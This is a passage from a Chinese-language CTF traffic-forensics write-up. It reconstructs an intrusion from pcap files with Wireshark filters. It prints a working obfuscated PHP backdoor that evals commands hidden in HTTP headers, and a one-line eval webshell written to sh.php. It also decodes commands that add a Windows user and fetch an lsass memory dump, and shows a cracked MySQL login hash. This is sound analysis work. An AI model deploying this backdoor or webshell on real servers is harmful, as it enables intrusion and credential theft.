+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span><span class="params">($t, $k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $c = strlen($k);</span><br><span class="line">    $l = strlen($t);</span><br><span class="line">    $o = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $l;) &#123;</span><br><span class="line">        <span class="keyword">for</span> ($j = <span class="number">0</span>; ($j &lt; $c &amp;&amp; $i &lt; $l); $j++, $i++) &#123;</span><br><span class="line">            $o .= $t&#123;$i&#125; ^ $k&#123;$j&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $o;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$r = $_SERVER;</span><br><span class="line">$rr = @$r[<span class="string">"HTTP_REFERER"</span>];</span><br><span class="line">$ra = @$r[<span class="string">"HTTP_ACCEPT_LANGUAGE"</span>];</span><br><span class="line"><span class="keyword">if</span> ($rr &amp;&amp; $ra) &#123;</span><br><span class="line">    $u = parse_url($rr);</span><br><span class="line">    parse_str($u[<span class="string">"query"</span>], $q);</span><br><span class="line">    $q = array_values($q);</span><br><span class="line">    preg_match_all(<span class="string">"/([\w])[\w-]+(?:;q=0.([\d]))?,?/"</span>, $ra, $m);</span><br><span class="line">    <span class="keyword">if</span> ($q &amp;&amp; $m) &#123;</span><br><span class="line">        @session_start();</span><br><span class="line">        $s =&amp; $_SESSION;</span><br><span class="line">        $ss = <span class="string">"substr"</span>;</span><br><span class="line">        $sl = <span class="string">"strtolower"</span>;</span><br><span class="line">        $i = $m[<span class="number">1</span>][<span class="number">0</span>] . $m[<span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">        $h = $sl($ss(md5($i . $kh), <span class="number">0</span>, <span class="number">3</span>));</span><br><span class="line">        $f = $sl($ss(md5($i . $kf), <span class="number">0</span>, <span class="number">3</span>));</span><br><span class="line">        $p = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">for</span> ($z = <span class="number">1</span>; $z &lt; count($m[<span class="number">1</span>]); $z++) $p .= $q[$m[<span class="number">2</span>][$z]];</span><br><span class="line">        <span class="keyword">if</span> (strpos($p, $h) === <span class="number">0</span>) &#123;</span><br><span class="line">            $s[$i] = <span class="string">""</span>;</span><br><span class="line">            $p = $ss($p, <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (array_key_exists($i, $s)) &#123;</span><br><span class="line">            $s[$i] .= $p;</span><br><span class="line">            $e = strpos($s[$i], $f);</span><br><span class="line">            <span class="keyword">if</span> ($e) &#123;</span><br><span class="line">                $k = $kh . $kf;</span><br><span class="line">                ob_start();</span><br><span class="line">                @<span class="keyword">eval</span>(@gzuncompress(@x(@base64_decode(preg_replace(<span class="keyword">array</span>(<span class="string">"/_/"</span>, <span class="string">"/-/"</span>), <span class="keyword">array</span>(<span class="string">"/"</span>, <span class="string">"+"</span>), $ss($s[$i], <span class="number">0</span>, $e))), $k)));</span><br><span class="line">                $o = ob_get_contents();</span><br><span class="line">                ob_end_clean();</span><br><span class="line">                $d = base64_encode(x(gzcompress($o), $k));</span><br><span class="line">                <span class="keyword">print</span>(<span class="string">"&lt;$k&gt;$d&lt;/$k&gt;"</span>);</span><br><span class="line">                @session_destroy();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以对于<code>$N=$j(&#39;&#39;, $x); $N()</code>就有</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$N = create_function(<span class="string">''</span>, $x); $N();</span><br></pre></td></tr></table></figure>
+
+<p>所以基本这个应该就是黑客第二次上传的php木马，时间是<code>2018-02-07 09:20:44.248365</code>。</p>
+<h4 id="8-第二次上传的木马通过HTTP协议中的哪个头传递数据"><a href="#8-第二次上传的木马通过HTTP协议中的哪个头传递数据" class="headerlink" title="8.第二次上传的木马通过HTTP协议中的哪个头传递数据"></a>8.第二次上传的木马通过HTTP协议中的哪个头传递数据</h4><p>这道题没看出来，因为涉及到上面的小马，等以后有时间再来研究下吧。。。</p>
+<h3 id="0x03-第四个数据包-jo-00004-20180207174021-pcap"><a href="#0x03-第四个数据包-jo-00004-20180207174021-pcap" class="headerlink" title="0x03 第四个数据包 jo_00004_20180207174021.pcap"></a>0x03 第四个数据包 jo_00004_20180207174021.pcap</h3><h4 id="9-内网主机的mysql用户名和请求连接的密码hash是多少-用户-密码hash"><a href="#9-内网主机的mysql用户名和请求连接的密码hash是多少-用户-密码hash" class="headerlink" title="9. 内网主机的mysql用户名和请求连接的密码hash是多少(用户:密码hash)"></a>9. 内网主机的mysql用户名和请求连接的密码hash是多少(用户:密码hash)</h4><p>打开第4个数据包，我们要找内网主机的mysql用户名和请求连接的密码。</p>
+<p>这一步需要了解的一个知识点就是用户在连接mysql时使用的网络协议，这个协议就是<code>mysql</code>协议。</p>
+<p>所以直接过滤协议为<code>mysql</code>的流量就可以了：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/18/Large_Traffic_Analysis-1/imgs/14.png" alt="14"></p>
+<p>看一下Info信息为<code>Login Request user=admin</code>的流量</p>
+<p><img src="/2020/04/18/Large_Traffic_Analysis-1/imgs/15.png" alt="15"></p>
+<p>可以看到里面包含<code>Username</code>和<code>Password</code>信息，但是这种请求很多，每次的密码hash值都不一样，而且跟踪一下tcp流我们可以看到提示<code>Accsess denied for user &#39;admin&#39;@&#39;192.168.1.8&#39;</code>：</p>
+<p><img src="/2020/04/18/Large_Traffic_Analysis-1/imgs/16.png" alt="16"></p>
+<p>这其实是黑客向主机<code>192.168.1.8</code>的mysql数据库发起的爆破，所以我们再进行一下过滤，过滤出该爆破的所有流量：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.src eq 192.168.1.8 and mysql</span><br></pre></td></tr></table></figure>
+
+<p>直接看最后一条有效请求：</p>
+<p><img src="/2020/04/18/Large_Traffic_Analysis-1/imgs/17.png" alt="17"></p>
+<p>跟踪一下tcp流，可以看到已经没有提示<code>Access denied</code>信息了，说明此时已经登录成功了：</p>
+<p><img src="/2020/04/18/Large_Traffic_Analysis-1/imgs/18.png" alt="18"></p>
+<p>所以登录账号是：<code>admin:1a3068c3e29e03e3bcfdba6f8669ad23349dc6c4</code>。</p>
+<h4 id="10-php代理第一次被使用时最先连接了哪个IP地址"><a href="#10-php代理第一次被使用时最先连接了哪个IP地址" class="headerlink" title="10 . php代理第一次被使用时最先连接了哪个IP地址"></a>10 . php代理第一次被使用时最先连接了哪个IP地址</h4><p>对于这个问题，简单进行一下过滤：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http and http.request.method &#x3D;&#x3D; POST</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/18/Large_Traffic_Analysis-1/imgs/19.png" alt="19"></p>
+<p>从结果可以看到，最先连接的ip地址是<code>4.2.2.2</code>。</p>
+<h3 id="0x04-第九个数据包-jo-00009-20180207183540-pcap"><a href="#0x04-第九个数据包-jo-00009-20180207183540-pcap" class="headerlink" title="0x04 第九个数据包 jo_00009_20180207183540.pcap"></a>0x04 第九个数据包 jo_00009_20180207183540.pcap</h3><h4 id="11-黑客第一次获取到当前目录下的文件列表的漏洞利用请求发生在什么时候"><a href="#11-黑客第一次获取到当前目录下的文件列表的漏洞利用请求发生在什么时候" class="headerlink" title="11.黑客第一次获取到当前目录下的文件列表的漏洞利用请求发生在什么时候"></a>11.黑客第一次获取到当前目录下的文件列表的漏洞利用请求发生在什么时候</h4><p>因为要读取目录，一般linux下我们就用<code>ls</code>读取目录，在windows就用<code>dir</code>命令读取文件，所以进行一下简单过滤：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http contains &quot;ls&quot; or http contains &quot;dir&quot;</span><br></pre></td></tr></table></figure>
+
+<p>第三条数据中就包含命令<code>ls</code>，是向<code>192.168.2.20</code>主机发起的请求：</p>
+<p><img src="/2020/04/18/Large_Traffic_Analysis-1/imgs/20.png" alt="20"></p>
+<p>跟踪一下tcp流，发现并没有成功执行：</p>
+<p><img src="/2020/04/18/Large_Traffic_Analysis-1/imgs/21.png" alt="21"></p>
+<p>所以看一下第2条数据，使用的命令是<code>dir</code>：</p>
+<p><img src="/2020/04/18/Large_Traffic_Analysis-1/imgs/22.png" alt="22"></p>
+<p>跟踪tcp流，可以发现命令被执行了：</p>
+<p><img src="/2020/04/18/Large_Traffic_Analysis-1/imgs/23.png" alt="23"></p>
+<p>所以黑客第一次获取到当前目录下的文件列表的漏洞利用请求发生在<code>2018-02-07 10:36:59.770782</code>。</p>
+<h4 id="12-黑客在内网主机中添加的用户名和密码是多少"><a href="#12-黑客在内网主机中添加的用户名和密码是多少" class="headerlink" title="12.黑客在内网主机中添加的用户名和密码是多少"></a>12.黑客在内网主机中添加的用户名和密码是多少</h4><p>上面一道题我们已经知道，黑客是在ip地址为<code>192.168.2.20</code>的windows主机上执行的命令，所以过滤一下该主机：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.addr &#x3D;&#x3D; 192.168.2.20 &amp;&amp; http</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/04/18/Large_Traffic_Analysis-1/imgs/24.png" alt="24"></p>
+<p>urldecode之后是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>=system&amp;<span class="number">1</span>=<span class="keyword">echo</span> <span class="string">"&lt;?php eval($_POST[123]);?&gt;"</span> &gt; sh.php</span><br></pre></td></tr></table></figure>
+
+<p>是通过echo将一句话木马写入了<code>sh.php</code>。然后应该是通过<code>sh.php</code>向windows主机<code>192.168.2.20</code>添加用户，所以我们过滤一下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.dst &#x3D;&#x3D; 192.168.2.20 &amp;&amp; http</span><br></pre></td></tr></table></figure>
+
+<p>但是查看了一些这些流量，没发现什么有价值的东西，所以我们可以看看从<code>192.168.2.20</code>返回的数据包中会不会有什么可用的信息：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.src &#x3D;&#x3D; 192.168.2.20 &amp;&amp; http</span><br></pre></td></tr></table></figure>
+
+<p>在<code>10:50:42.908737</code>这时从<code>192.168.2.20</code>主机返回的数据包里有用户<code>kaka</code>的信息：</p>
+<p><img src="/2020/04/18/Large_Traffic_Analysis-1/imgs/25.png" alt="25"></p>
+<p>但是不能就这样下结论说这就是新添加的用户，所以再过滤一下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.addr &#x3D;&#x3D; 192.168.2.20 &amp;&amp; http</span><br></pre></td></tr></table></figure>
+
+<p>我们看一下这个时间节点<code>10:50:42.908737</code>之前发生了什么事情，这是主机<code>192.168.1.8</code>被黑客控制后向windows主机<code>192.168.2.20</code>通过<code>sh.php</code>发起的POST请求：</p>
+<p><img src="/2020/04/18/Large_Traffic_Analysis-1/imgs/26.png" alt="26"></p>
+<p>我们对这个POST请求参数<code>z2</code>进行base64解码，得到：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd&#x2F;d&quot;C:\phpStudy\WWW\b2evolution\install\test\&quot;&amp;net user&amp;echo [S]&amp;cd&amp;echo [E]</span><br></pre></td></tr></table></figure>
+
+<p>这里的<code>net user</code>是在windows上添加用户的命令，如<code>net user aaa 123456</code>就能创建一个密码为<code>123456</code>的<code>aaa</code>用户。</p>
+<p>但是这里并没有说明用户<code>kaka</code>被添加了，看一下前几条POST请求，在<code>10:49:48.830665</code>由<code>192.168.1.8</code>向<code>192.168.2.20</code>发送的post请求中，终于看到了我们想要看到的信息：</p>
+<p><img src="/2020/04/18/Large_Traffic_Analysis-1/imgs/27.png" alt="27"></p>
+<p>解码后得到：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd&#x2F;d&quot;C:\phpStudy\WWW\b2evolution\install\test\&quot;&amp;net user kaka kaka &#x2F;add&amp;echo [S]&amp;cd&amp;echo [E]</span><br></pre></td></tr></table></figure>
+
+<p>此时就可以确定黑客向内网主机添加的用户是<code>kaka</code>，密码是<code>kaka</code>。</p>
+<h4 id="13-黑客从内网服务器中下载下来的文件名"><a href="#13-黑客从内网服务器中下载下来的文件名" class="headerlink" title="13.黑客从内网服务器中下载下来的文件名"></a>13.黑客从内网服务器中下载下来的文件名</h4><p>既然受害主机是<code>192.168.2.20</code>，所以对向该主机发送的请求进行过滤，而且黑客应该是利用中国菜刀进行的下载，所以我们只过滤出POST流量：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.dst &#x3D;&#x3D; 192.168.2.20 &amp;&amp; http.request.method &#x3D;&#x3D; POST</span><br></pre></td></tr></table></figure>
+
+<p>我们直接看最后一条流量</p>
+<p><img src="/2020/04/18/Large_Traffic_Analysis-1/imgs/28.png" alt="28"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QzpccGhwU3R1ZHlcV1dXXGIyZXZvbHV0aW9uXGluc3RhbGxcdGVzdFxsc2Fzcy5leGVfMTgwMjA4XzE4NTI0Ny5kbXA&#x3D;</span><br></pre></td></tr></table></figure>
+
+<p>base64解码后得到：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\phpStudy\WWW\b2evolution\install\test\lsass.exe_180208_185247.dmp</span><br></pre></td></tr></table></figure>
+
+<p>所以黑客从内网服务器中下载下来的文件名是<code>lsass.exe_180208_185247.dmp</code>。</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>Bantian</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://bantttian.github.io/2020/04/18/Large_Traffic_Analysis-1/">https://bantttian.github.io/2020/04/18/Large_Traffic_Analysis-1/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>早睡早起身体好</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"># 流量分析</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/04/20/OverTheWire-Natas-Walkthrough-1/">OverTheWire Natas Walkthrough-1</a>
+            
+            
+            <a class="next" rel="next" href="/2020/04/11/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8%E4%B9%8B%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/">强网杯2019_随便注之堆叠注入</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Bantian | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
